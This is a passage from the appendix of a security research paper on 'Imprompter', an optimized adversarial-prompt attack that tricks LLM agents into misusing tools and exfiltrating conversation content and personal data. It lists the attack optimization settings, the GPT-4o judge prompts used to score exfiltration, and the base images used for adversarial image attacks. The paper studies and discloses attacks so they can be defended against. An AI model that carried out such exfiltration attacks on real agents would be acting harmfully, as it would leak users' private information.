## Appendix A Appendix

### A.1\. Optimization Parameters

Due to the randomness involved in the proposal selection stage ($p$ out of $k$ tokens are randomly selected), trying out various combinations of parameters of the algorithm and/or conducting multiple trials under the same setting would be reasonable. The computation environment would constrain the choices of $p$ and $s$ respectively. Also, the larger the token length $n$ of the example, the easier the optimization, but slower. Finding a balanced range of $n$ specific to the computation environment empirically would be beneficial. We report the other optimization parameters as well as the number of steps used for optimization in Table [7](https://arxiv.org/html/2410.14923v2#A1.T7 "Table 7 ‣ A.1\. Optimization Parameters ‣ Appendix A Appendix ‣ Disclosure and Response ‣ Acknowledgements ‣ 8\. Conclusion ‣ Prompt Optimization. ‣ 7\. Related Work ‣ Open-weights access vs. Black-box. ‣ 6\. Discussion & Limitations ‣ What happens when the attacks fail? ‣ Results on the Real Product. ‣ Results on the Local LLM. ‣ Metrics. ‣ Dataset Construction. ‣ 5.2\. PII Exfiltration Attack ‣ Results on Local Visual LLM. ‣ Results on Real Products. ‣ Results on local Text LLMs. ‣ Metrics. ‣ Training Dataset Construction. ‣ 5.1\. Information Exfiltration Attack ‣ 5\. Evaluation ‣ Imprompter: Tricking LLM Agents into Improper Tool Use"). We report $\lambda$, $p$, $s$ and vocab_mask in the table. The number of top candidates chosen $k$ is always set to 256 in all of our experiments. Note that for T5-T8, instead of randomly choosing a subset for each round, we select a fixed subset before training. A fixed subset benefits the estimation of candidate prompt performance but sacrifices the generalize-ability offered by exploring more training examples.

Table 7. Parameters for the attacks trained and the number of steps used for optimization, where $\lambda$, $p$ and $s$ denotes the syntax weight, number of tokens randomly sampled per position and the subset size. Vocab_mask represents the vocabulary used for optimization.

| # | $\lambda$ | p | s | vocab_mask | steps |
| T1 | 1 | 6 | 24 | all_allow | 147 |
| T2 | 1 | 6 | 24 | all_allow | 125 |
| T3 | 0 | 8 | 24 | non_english | 89 |
| T4 | 0 | 6 | 24 | non_english | 127 |
| T5 | 0.1 | 6 | 36 | all_allow | 135 |
| T6 | 0.5 | 6 | 36 | non_english | 77 |
| T7 | 1 | 6 | 24 | all_allow | 95 |
| T8 | 1 | 6 | 24 | non_english | 22 |
| T9 | 1 | 6 | 24 | all_allow | 153 |
| T10 | 1 | 6 | 24 | all_allow | 59 |
| T11 | 0.35 | 6 | 24 | all_allow | 56 |
| T12 | 0.35 | 6 | 24 | non_english | 53 |

### A.2\. Prompt List

We leveraged GPT-4-o to calculate an information exfiltration rate (Word Extraction GPT Score) and PII exfiltration rate (Context GPT Score). We present the prompts used for these two tasks:

Prompt to query GPT-4-o for Word Extraction GPT Score. {minted}[breaklines,breakanywhere,breaksymbolleft=,breakanywheresymbolpre=,frame=single]text I’m going to present a list of keywords extracted from the above conversation between you and me. If you think it captures some of the keywords of the our conversation above, return True. Otherwise, return False. You are judging the existence, not completeness of the keywords. You should always return either True or False in unformatted plaintext.\n\nList:\nkeywords\n\nYourJudge Answer:\n

Prompt to query GPT-4-o for Context GPT Score. {minted}[breaklines,breakanywhere,breaksymbolleft=,breakanywheresymbolpre=,frame=single]text Does the following string provide any information about the subject of my prior request or intention of my request or affairs that I’m involved? Answer with ONLY True or False. Remember, I’m asking about existence, so as long as some information I asked above is provided, you should return True.\n\nList:\nkeywords\n\nYourJudge Answer:\n

### A.3\. Base Image for Image Attack

Figure [4](https://arxiv.org/html/2410.14923v2#A1.F4 "Figure 4 ‣ A.3\. Base Image for Image Attack ‣ Appendix A Appendix ‣ Disclosure and Response ‣ Acknowledgements ‣ 8\. Conclusion ‣ Prompt Optimization. ‣ 7\. Related Work ‣ Open-weights access vs. Black-box. ‣ 6\. Discussion & Limitations ‣ What happens when the attacks fail? ‣ Results on the Real Product. ‣ Results on the Local LLM. ‣ Metrics. ‣ Dataset Construction. ‣ 5.2\. PII Exfiltration Attack ‣ Results on Local Visual LLM. ‣ Results on Real Products. ‣ Results on local Text LLMs. ‣ Metrics. ‣ Training Dataset Construction. ‣ 5.1\. Information Exfiltration Attack ‣ 5\. Evaluation ‣ Imprompter: Tricking LLM Agents into Improper Tool Use") displays the six base images we used for the image attack. The first one is a famous AI-generated picture of a llama, following four images randomly sampled from the Shutterstock^(11)^(11)11[https://www.shutterstock.com/](https://www.shutterstock.com/) image database, and the last one is purely white.

![Refer to caption](img/9e386aae4511b9ed4cdffb6ba836183b.png)

((a)) V1

![Refer to caption](img/bae7081e73ed9eb71cb5889e90e922ea.png)

((b)) V2

![Refer to caption](img/636c631482786909dc0230d321a6202f.png)

((c)) V3

![Refer to caption](img/ac1dedc5cf2195df62bc70d24f5ff78b.png)

((d)) V4

![Refer to caption](img/f4e42ee71cbf2d6724f22afc308702b4.png)

((e)) V5

![Refer to caption](img/0c65120d84eaad375693fe9ca6470c46.png)

((f)) V6

Figure 4. Base images of adversarial images in Figure [3](https://arxiv.org/html/2410.14923v2#S5.F3 "Figure 3 ‣ Results on Local Visual LLM. ‣ Results on Real Products. ‣ Results on local Text LLMs. ‣ Metrics. ‣ Training Dataset Construction. ‣ 5.1\. Information Exfiltration Attack ‣ 5\. Evaluation ‣ Imprompter: Tricking LLM Agents into Improper Tool Use").